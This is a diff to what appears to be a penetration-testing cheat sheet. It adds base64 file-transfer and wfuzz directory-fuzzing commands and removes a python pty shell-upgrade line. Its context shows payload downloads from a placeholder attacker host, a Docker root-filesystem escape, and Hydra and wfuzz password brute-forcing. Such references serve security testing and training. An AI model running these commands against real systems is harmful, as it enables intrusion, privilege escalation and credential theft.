@@ -66,6 +66,16 @@ wget http://<ATTACKER_IP>:8000/<FILE_NAME>
 powershell -c "Invoke-WebRequest -Uri 'http://<ATTACKER_IP>:8000/<FILE_NAME>' -OutFile '<FILE_NAME>'"
 ```
 
+## Base64 Encoding/Decoding Transfer
+
+```bash
+base64 <FILE_NAME> | tr -d '\n'
+```
+
+```bash
+echo "BASE64_STRING_HERE" | base64 -d > <FILE_NAME>
+```
+
 ## Netcat File Transfer
 
 ```bash
@@ -124,10 +134,6 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```
 
 ## Shell Upgrade and Stabilization
-
-```bash
-python -c 'import pty; pty.spawn("/bin/bash")'
-```
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -234,6 +240,10 @@ hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form 
 
 ```bash
 wfuzz -w /usr/share/wordlists/rockyou.txt -X POST -d '{"username":"<LOGIN>","password":"FUZZ"}' -u http://<TARGET_IP>/login
+```
+
+```bash
+wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<TARGET_IP>/FUZZ --hc 404
 ```
 
 ```bash
